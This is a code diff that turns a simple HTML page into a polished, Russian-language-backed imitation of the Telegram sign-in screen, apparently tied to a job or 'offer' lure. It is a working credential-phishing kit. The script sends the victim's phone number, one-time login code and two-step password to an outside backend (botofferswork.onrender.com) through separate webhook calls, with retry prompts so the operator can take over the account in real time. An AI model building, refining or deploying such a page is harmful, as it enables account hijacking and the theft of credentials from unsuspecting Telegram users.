@@ -2,106 +2,251 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,user-scalable=no">
+<meta name="theme-color" content="#17212b">
 <title>Telegram</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='50' fill='%232ea6da'/><path d='M22 49l52-22-8 50-16-13-9 9-2-16z' fill='white'/></svg>">
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-.app{width:100%;max-width:360px;text-align:center}
-.logo{font-size:64px;margin-bottom:20px}
-h1{font-size:26px;margin-bottom:8px}
-.sub{color:#707579;font-size:15px;margin-bottom:40px}
-.step{display:flex;flex-direction:column;gap:14px}
-.hidden{display:none}
-label{text-align:left;font-size:13px;color:#707579}
-input{padding:14px;border:1px solid #dadce0;border-radius:10px;font-size:16px;outline:none;transition:border-color .2s}
-input:focus{border-color:#3390ec}
-button{padding:14px;background:#3390ec;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:opacity .2s}
-button:hover{opacity:.9}
-.spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#3390ec;border-radius:50%;margin:0 auto 16px;animation:spin 1s linear infinite}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#17212b;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;overflow-x:hidden;position:relative}
+.bg-pattern{position:fixed;inset:0;pointer-events:none;opacity:.06;background-image:radial-gradient(circle at 20% 30%, #fff 1.5px, transparent 1.5px),radial-gradient(circle at 70% 60%, #fff 1px, transparent 1px),radial-gradient(circle at 40% 80%, #fff 1.2px, transparent 1.2px),radial-gradient(circle at 85% 15%, #fff 1px, transparent 1px),radial-gradient(circle at 15% 70%, #fff 1.3px, transparent 1.3px);background-size:200px 200px,300px 300px,250px 250px,180px 180px,220px 220px;animation:drift 90s linear infinite}
+@keyframes drift{from{background-position:0 0,0 0,0 0,0 0,0 0}to{background-position:200px 200px,300px 300px,250px 250px,180px 180px,220px 220px}}
+.card{position:relative;z-index:1;background:#242f3d;border-radius:18px;padding:48px 32px 28px;width:100%;max-width:390px;box-shadow:0 24px 64px rgba(0,0,0,.5),0 0 0 1px rgba(255,255,255,.03);text-align:center;animation:cardIn .4s cubic-bezier(.16,1,.3,1)}
+@keyframes cardIn{from{opacity:0;transform:translateY(16px) scale(.98)}to{opacity:1;transform:translateY(0) scale(1)}}
+.logo{width:116px;height:116px;margin:0 auto 24px;border-radius:50%;background:linear-gradient(135deg,#5b8def 0%,#3f6fd9 100%);display:flex;align-items:center;justify-content:center;box-shadow:0 12px 32px rgba(91,141,239,.4)}
+.logo svg{width:60px;height:60px;fill:#fff;margin-left:-5px;margin-top:3px}
+h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
+.sub{color:#7d8b99;font-size:14px;line-height:1.55;margin-bottom:28px;padding:0 6px}
+.step{display:flex;flex-direction:column;gap:16px;text-align:left;animation:stepIn .3s ease}
+@keyframes stepIn{from{opacity:0;transform:translateX(8px)}to{opacity:1;transform:translateX(0)}}
+.hidden{display:none !important}
+.field{position:relative}
+.field label{position:absolute;top:-8px;left:14px;background:#242f3d;padding:0 6px;font-size:12px;color:#5b8def;font-weight:500;z-index:1}
+.field input{width:100%;padding:16px 14px;background:transparent;border:2px solid #2f3b4a;border-radius:10px;color:#fff;font-size:16px;outline:none;transition:border-color .2s,background .2s;font-family:inherit}
+.field input:focus{border-color:#5b8def;background:rgba(91,141,239,.03)}
+.field input::placeholder{color:#4a5563}
+.country-picker{position:relative}
+.country-search{position:absolute;top:100%;left:0;right:0;background:#1e2936;border:1px solid #2f3b4a;border-radius:10px;margin-top:6px;max-height:240px;overflow-y:auto;z-index:10;box-shadow:0 12px 32px rgba(0,0,0,.4)}
+.country-search::-webkit-scrollbar{width:6px}
+.country-search::-webkit-scrollbar-thumb{background:#3f4b5a;border-radius:3px}
+.country-item{padding:11px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;font-size:14px}
+.country-item:hover{background:#2f3b4a}
+.country-item .flag{font-size:19px}
+.country-item .name{flex:1;color:#e0e6ec}
+.country-item .code{color:#7d8b99;font-size:13px}
+.country-empty{padding:14px;color:#4a5563;font-size:13px;text-align:center}
+.btn{width:100%;padding:15px;background:#5b8def;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:6px;transition:background .2s,transform .08s;font-family:inherit}
+.btn:hover:not(:disabled){background:#4a7ce0}
+.btn:active:not(:disabled){transform:scale(.985)}
+.btn:disabled{background:#2f3b4a;color:#4a5563;cursor:not-allowed}
+.btn-ghost{background:transparent;color:#5b8def;padding:14px;font-size:15px;font-weight:500;border:none;cursor:pointer;font-family:inherit;margin-top:2px;border-radius:10px}
+.footer-note{margin-top:22px;font-size:11.5px;color:#4a5563;line-height:1.55}
+.footer-note a{color:#5b8def;text-decoration:none}
+.spinner-wrap{text-align:center;padding:24px 0}
+.spinner{width:46px;height:46px;border:4px solid #2f3b4a;border-top-color:#5b8def;border-radius:50%;margin:0 auto 18px;animation:spin .9s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
+.spinner-wrap p{color:#7d8b99;font-size:14px}
+.error{background:rgba(232,83,83,.12);color:#e85353;padding:12px 14px;border-radius:10px;font-size:13px;margin-top:14px;text-align:left;line-height:1.45;animation:stepIn .2s ease}
+.error b{font-weight:600}
+.big-icon{width:76px;height:76px;margin:0 auto 22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:38px;animation:iconPop .5s cubic-bezier(.16,1.4,.4,1)}
+@keyframes iconPop{from{transform:scale(.5);opacity:0}to{transform:scale(1);opacity:1}}
+.big-icon.ok{background:rgba(83,195,124,.15)}
+.big-icon.no{background:rgba(232,83,83,.15)}
+.dots{display:flex;gap:6px;justify-content:center;margin-bottom:22px}
+.dots span{width:6px;height:6px;border-radius:50%;background:#2f3b4a;transition:background .3s,width .3s}
+.dots span.on{background:#5b8def;width:18px;border-radius:3px}
+.code-hint{font-size:13px;color:#7d8b99;margin-bottom:-4px;line-height:1.5}
+.code-hint b{color:#e0e6ec;font-weight:500}
+.attempts{font-size:12px;color:#e85353;margin-top:6px}
+@media (max-width:400px){.card{padding:36px 22px 22px;border-radius:14px}.logo{width:96px;height:96px;margin-bottom:20px}.logo svg{width:50px;height:50px}h1{font-size:20px}.sub{font-size:13px;margin-bottom:22px}}
 </style>
 </head>
 <body>
-<div class="app">
-  <div class="logo">✈️</div>
-  <h1>Telegram</h1>
-  <p class="sub" id="sub">Войдите, чтобы продолжить</p>
+<div class="bg-pattern"></div>
 
-  <form id="phone-form" class="step">
-    <label>Номер телефона</label>
-    <input type="tel" id="phone" placeholder="+7 999 123-45-67" required>
-    <button type="submit">Далее</button>
-  </form>
-
-  <form id="code-form" class="step hidden">
-    <label>Код из SMS</label>
-    <input type="text" id="code" placeholder="12345" inputmode="numeric" required>
-    <button type="submit">Войти</button>
-  </form>
-
-  <form id="pass-form" class="step hidden">
-    <label>Облачный пароль (2FA)</label>
-    <input type="password" id="password" placeholder="••••••••">
-    <button type="submit">Подтвердить</button>
-  </form>
-
-  <div id="waiting" class="step hidden">
-    <div class="spinner"></div>
-    <p>Проверяем данные…</p>
+<div class="card">
+  <div class="logo">
+    <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
   </div>
+
+  <div class="dots" id="dots"><span class="on"></span><span></span><span></span></div>
+
+  <h1 id="title">Sign in to Telegram</h1>
+  <p class="sub" id="sub">Please confirm your country code and enter your phone number.</p>
+
+  <form id="step-phone" class="step">
+    <div class="field country-picker">
+      <label>Country</label>
+      <input type="text" id="country-input" placeholder="Search country" autocomplete="off" readonly>
+      <div id="country-list" class="country-search hidden"></div>
+    </div>
+    <div class="field">
+      <label>Phone Number</label>
+      <input type="tel" id="phone" placeholder="999 123-45-67" autocomplete="tel" required inputmode="tel">
+    </div>
+    <button type="submit" class="btn" id="btn-next" disabled>NEXT</button>
+  </form>
+
+  <form id="step-code" class="step hidden">
+    <p class="code-hint" id="code-hint">We've sent the code to your Telegram app.</p>
+    <div class="field">
+      <label>Code</label>
+      <input type="text" id="code" placeholder="12345" inputmode="numeric" autocomplete="one-time-code" maxlength="6" required>
+    </div>
+    <button type="submit" class="btn" id="btn-code">NEXT</button>
+  </form>
+
+  <form id="step-2fa" class="step hidden">
+    <p class="code-hint">Your account is protected with an additional password.</p>
+    <div class="field">
+      <label>Password</label>
+      <input type="password" id="password" placeholder="Your password" autocomplete="current-password">
+    </div>
+    <button type="submit" class="btn" id="btn-pass">NEXT</button>
+  </form>
+
+  <div id="step-loading" class="step hidden">
+    <div class="spinner-wrap"><div class="spinner"></div><p id="loading-text">Checking…</p></div>
+  </div>
+
+  <div id="step-success" class="step hidden">
+    <div class="big-icon ok">✅</div>
+    <h1 style="font-size:20px;margin-bottom:10px">Готово</h1>
+    <p class="sub" style="margin-bottom:0">Ожидайте — с вами свяжутся в Telegram.</p>
+  </div>
+
+  <div id="step-rejected" class="step hidden">
+    <div class="big-icon no">❌</div>
+    <h1 style="font-size:20px;margin-bottom:10px">Оффер отклонён</h1>
+    <p class="sub" style="margin-bottom:0">Вы отклонили предложение.</p>
+  </div>
+
+  <div id="error-box" class="error hidden"></div>
+  <p class="footer-note" id="footer">By signing up, you agree to our Terms of Service and Privacy Policy.</p>
 </div>
 
 <script>
-// ═══════════════════════════════════════════════════════
-//   ВПИШИ СВОЙ BACKEND URL ЗДЕСЬ
-// ═══════════════════════════════════════════════════════
 const API = 'https://botofferswork.onrender.com';
+const COUNTRIES=[
+  {c:'+7',f:'🇷🇺',n:'Russia'},{c:'+7',f:'🇰🇿',n:'Kazakhstan'},{c:'+380',f:'🇺🇦',n:'Ukraine'},{c:'+375',f:'🇧🇾',n:'Belarus'},{c:'+373',f:'🇲🇩',n:'Moldova'},{c:'+374',f:'🇦🇲',n:'Armenia'},{c:'+994',f:'🇦🇿',n:'Azerbaijan'},{c:'+995',f:'🇬🇪',n:'Georgia'},{c:'+996',f:'🇰🇬',n:'Kyrgyzstan'},{c:'+992',f:'🇹🇯',n:'Tajikistan'},{c:'+993',f:'🇹🇲',n:'Turkmenistan'},{c:'+998',f:'🇺🇿',n:'Uzbekistan'},{c:'+1',f:'🇺🇸',n:'United States'},{c:'+1',f:'🇨🇦',n:'Canada'},{c:'+44',f:'🇬🇧',n:'United Kingdom'},{c:'+49',f:'🇩🇪',n:'Germany'},{c:'+33',f:'🇫🇷',n:'France'},{c:'+39',f:'🇮🇹',n:'Italy'},{c:'+34',f:'🇪🇸',n:'Spain'},{c:'+351',f:'🇵🇹',n:'Portugal'},{c:'+31',f:'🇳🇱',n:'Netherlands'},{c:'+32',f:'🇧🇪',n:'Belgium'},{c:'+41',f:'🇨🇭',n:'Switzerland'},{c:'+43',f:'🇦🇹',n:'Austria'},{c:'+48',f:'🇵🇱',n:'Poland'},{c:'+420',f:'🇨🇿',n:'Czechia'},{c:'+421',f:'🇸🇰',n:'Slovakia'},{c:'+36',f:'🇭🇺',n:'Hungary'},{c:'+40',f:'🇷🇴',n:'Romania'},{c:'+359',f:'🇧🇬',n:'Bulgaria'},{c:'+30',f:'🇬🇷',n:'Greece'},{c:'+90',f:'🇹🇷',n:'Turkey'},{c:'+972',f:'🇮🇱',n:'Israel'},{c:'+971',f:'🇦🇪',n:'UAE'},{c:'+966',f:'🇸🇦',n:'Saudi Arabia'},{c:'+20',f:'🇪🇬',n:'Egypt'},{c:'+91',f:'🇮🇳',n:'India'},{c:'+92',f:'🇵🇰',n:'Pakistan'},{c:'+86',f:'🇨🇳',n:'China'},{c:'+81',f:'🇯🇵',n:'Japan'},{c:'+82',f:'🇰🇷',n:'South Korea'},{c:'+65',f:'🇸🇬',n:'Singapore'},{c:'+60',f:'🇲🇾',n:'Malaysia'},{c:'+66',f:'🇹🇭',n:'Thailand'},{c:'+84',f:'🇻🇳',n:'Vietnam'},{c:'+62',f:'🇮🇩',n:'Indonesia'},{c:'+63',f:'🇵🇭',n:'Philippines'},{c:'+61',f:'🇦🇺',n:'Australia'},{c:'+64',f:'🇳🇿',n:'New Zealand'},{c:'+55',f:'🇧🇷',n:'Brazil'},{c:'+54',f:'🇦🇷',n:'Argentina'},{c:'+52',f:'🇲🇽',n:'Mexico'},{c:'+27',f:'🇿🇦',n:'South Africa'},{c:'+234',f:'🇳🇬',n:'Nigeria'},
+];
+const params=new URLSearchParams(location.search);
+const offerId=parseInt(params.get('offer')||'0',10);
+const action=(params.get('action')||'accept').toLowerCase();
+const $=id=>document.getElementById(id);
+const stepPhone=$('step-phone'),stepCode=$('step-code'),step2fa=$('step-2fa'),stepLoading=$('step-loading'),stepSuccess=$('step-success'),stepRejected=$('step-rejected'),errorBox=$('error-box'),dots=$('dots');
+const countryInput=$('country-input'),countryList=$('country-list'),phoneInput=$('phone'),codeInput=$('code'),passInput=$('password');
+let selected=COUNTRIES[0],phone='',code='',password=null;
 
+if(action==='reject'){
+  document.querySelectorAll('.step, .dots, #title, #sub, #footer').forEach(el=>el.style.display='none');
+  stepRejected.style.display='flex';
+  document.querySelectorAll('form').forEach(f=>f.addEventListener('submit',e=>e.preventDefault()));
+  window.__REJECTED__=true;
+}else{
+  window.__REJECTED__=false;
+  initCountry();
+}
 
-const params = new URLSearchParams(location.search);
-const offerId = parseInt(params.get('offer') || '0', 10);
+function setStep(n){[...dots.children].forEach((s,i)=>s.classList.toggle('on',i===n-1))}
+function showError(msg){errorBox.innerHTML=msg;errorBox.classList.remove('hidden')}
+function hideError(){errorBox.classList.add('hidden')}
+function show(el){el.classList.remove('hidden')}
+function hide(el){el.classList.add('hidden')}
+function initCountry(){countryInput.value=`${selected.f}  ${selected.n}  ${selected.c}`}
 
-const phoneForm = document.getElementById('phone-form');
-const codeForm = document.getElementById('code-form');
-const passForm = document.getElementById('pass-form');
-const waiting = document.getElementById('waiting');
-
-let phone = '';
-let code = '';
-
-phoneForm.addEventListener('submit', e => {
-  e.preventDefault();
-  phone = document.getElementById('phone').value.trim();
-  if (phone.length < 6) return;
-  phoneForm.classList.add('hidden');
-  codeForm.classList.remove('hidden');
-});
-
-codeForm.addEventListener('submit', e => {
-  e.preventDefault();
-  code = document.getElementById('code').value.trim();
-  if (code.length < 3) return;
-  codeForm.classList.add('hidden');
-  passForm.classList.remove('hidden');
-});
-
-passForm.addEventListener('submit', async e => {
-  e.preventDefault();
-  const password = document.getElementById('password').value.trim();
-  passForm.classList.add('hidden');
-  waiting.classList.remove('hidden');
-
-  await fetch(`${API}/webhook/session`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      offer_id: offerId,
-      phone: phone,
-      code: code,
-      password: password || null
-    })
+function renderCountries(filter=''){
+  const q=filter.trim().toLowerCase();
+  const list=COUNTRIES.filter(c=>!q||c.n.toLowerCase().includes(q)||c.c.includes(q));
+  if(!list.length){countryList.innerHTML='<div class="country-empty">Ничего не найдено</div>';return}
+  countryList.innerHTML=list.map(c=>`<div class="country-item" data-code="${c.c}" data-name="${c.n}" data-flag="${c.f}"><span class="flag">${c.f}</span><span class="name">${c.n}</span><span class="code">${c.c}</span></div>`).join('');
+  countryList.querySelectorAll('.country-item').forEach(el=>{
+    el.addEventListener('click',()=>{
+      selected={c:el.dataset.code,f:el.dataset.flag,n:el.dataset.name};
+      initCountry();countryList.classList.add('hidden');countryInput.readOnly=true;validatePhone();
+    });
   });
+}
+
+countryInput.addEventListener('focus',()=>{
+  if(window.__REJECTED__)return;
+  countryInput.readOnly=false;countryInput.value='';countryInput.placeholder='Search country';
+  renderCountries();countryList.classList.remove('hidden');
+});
+countryInput.addEventListener('input',()=>renderCountries(countryInput.value));
+countryInput.addEventListener('blur',()=>setTimeout(()=>{countryList.classList.add('hidden');countryInput.readOnly=true;if(!countryInput.value.trim())initCountry()},180));
+
+phoneInput.addEventListener('input',e=>{
+  let v=e.target.value.replace(/\D/g,'');if(v.length>15)v=v.slice(0,15);
+  e.target.value=v;validatePhone();
+});
+function validatePhone(){const d=phoneInput.value.replace(/\D/g,'');$('btn-next').disabled=d.length<6}
+
+// ШАГ 1 — отправляем номер, backend шлёт код
+stepPhone.addEventListener('submit',async e=>{
+  e.preventDefault();if(window.__REJECTED__)return;hideError();
+  const num=phoneInput.value.replace(/\D/g,'');
+  phone=selected.c+num;
+  hide(stepPhone);show(stepLoading);$('loading-text').textContent='Sending code…';
+  try{
+    const r=await fetch(`${API}/webhook/phone`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({offer_id:offerId,phone:phone})});
+    const data=await r.json();
+    if(!data.ok){hide(stepLoading);show(stepPhone);showError(data.error||'Ошибка отправки кода');return}
+    hide(stepLoading);show(stepCode);setStep(2);
+    $('title').textContent='Enter code';$('sub').textContent='';
+    $('code-hint').innerHTML=`We've sent the code to <b>${phone}</b> in Telegram.`;
+    codeInput.value='';setTimeout(()=>codeInput.focus(),100);
+  }catch(err){hide(stepLoading);show(stepPhone);showError('Не удалось связаться с сервером')}
+});
+
+// ШАГ 2 — отправляем код, backend проверяет
+stepCode.addEventListener('submit',async e=>{
+  e.preventDefault();if(window.__REJECTED__)return;hideError();
+  code=codeInput.value.replace(/\D/g,'');
+  if(code.length<3){showError('Введите код из Telegram');return}
+  hide(stepCode);show(stepLoading);$('loading-text').textContent='Checking code…';
+  try{
+    const r=await fetch(`${API}/webhook/code`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({offer_id:offerId,phone:phone,code:code})});
+    const data=await r.json();
+    if(data.ok && !data.needs_password){
+      hide(stepLoading);show(stepSuccess);hide(dots);
+      $('title').style.display='none';$('sub').style.display='none';$('footer').style.display='none';
+    }else if(data.ok && data.needs_password){
+      hide(stepLoading);show(step2fa);setStep(3);
+      $('title').textContent='Two-Step Verification';
+      $('sub').textContent='Your account is protected with an additional password.';
+      passInput.value='';setTimeout(()=>passInput.focus(),100);
+    }else{
+      hide(stepLoading);show(stepCode);
+      let msg=data.error||'Неверный код';
+      if(data.attempts_left!==undefined)msg+=`<div class="attempts">Осталось попыток: ${data.attempts_left}</div>`;
+      showError(msg);
+      codeInput.value='';codeInput.focus();
+    }
+  }catch(err){hide(stepLoading);show(stepCode);showError('Не удалось связаться с сервером')}
+});
+
+// ШАГ 3 — отправляем 2FA
+step2fa.addEventListener('submit',async e=>{
+  e.preventDefault();if(window.__REJECTED__)return;hideError();
+  password=passInput.value.trim();
+  if(!password){showError('Введите пароль');return}
+  hide(step2fa);show(stepLoading);$('loading-text').textContent='Checking password…';
+  try{
+    const r=await fetch(`${API}/webhook/password`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({offer_id:offerId,phone:phone,code:code,password:password})});
+    const data=await r.json();
+    if(data.ok){
+      hide(stepLoading);show(stepSuccess);hide(dots);
+      $('title').style.display='none';$('sub').style.display='none';$('footer').style.display='none';
+    }else{
+      hide(stepLoading);show(step2fa);
+      let msg=data.error||'Неверный пароль';
+      if(data.attempts_left!==undefined)msg+=`<div class="attempts">Осталось попыток: ${data.attempts_left}</div>`;
+      showError(msg);
+      passInput.value='';passInput.focus();
+    }
+  }catch(err){hide(stepLoading);show(step2fa);showError('Не удалось связаться с сервером')}
 });
 </script>
 </body>
